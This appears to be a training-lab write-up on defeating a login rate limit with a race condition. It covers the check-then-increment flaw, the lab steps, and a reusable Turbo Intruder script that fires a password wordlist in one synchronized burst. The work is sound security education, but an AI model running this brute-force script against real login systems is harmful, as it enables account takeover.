# Lab: Bypassing Rate Limits via Race Conditions

**Category:** Race Conditions
**Difficulty:** Practitioner
**Status:** ✅ Solved
**Tool used:** Burp Suite Community Edition — Turbo Intruder

## Objective
Brute-force `carlos`'s password despite a per-username rate limit (locks after 3 failed attempts), by exploiting the race window before the failed-attempt counter updates server-side.

## Why This Works
The rate limit check and the counter increment happen as two separate steps. If all password attempts are sent in one synchronized burst (single-packet style), they all pass the "are you locked out?" check before the server finishes updating the counter — so far more than 3 attempts get processed.

## Steps

1. Captured a `POST /login` request (failed attempt) → sent to **Turbo Intruder**.
2. Replaced the password value with the `%s` placeholder.
3. Used `concurrentConnections=1` + `engine=Engine.BURP2` (single-packet attack) to fire the entire wordlist simultaneously via the `gate` mechanism.
4. Filtered results by response — most attempts returned `400`/"Invalid username or password", but **one row returned a different status/response**, confirming the correct password.
5. Logged in as `carlos` with the cracked password.
6. Accessed the **Admin panel**.
7. Deleted user `carlos`.
8. Lab marked **Solved**. ✅

## Script (reusable for future race-based brute-force labs)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )

    with open('/path/to/wordlist.txt') as f:
        passwords = [line.strip() for line in f]

    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

> Request body should have password field set as: `username=carlos&password=%s`

## Key Takeaway
Rate limits that check-then-increment are vulnerable to the same single-packet race technique as coupon/discount abuse. Turbo Intruder's `gate` feature is the 80/20 tool here — no need for manual Repeater duplication when brute-forcing a wordlist under race conditions.
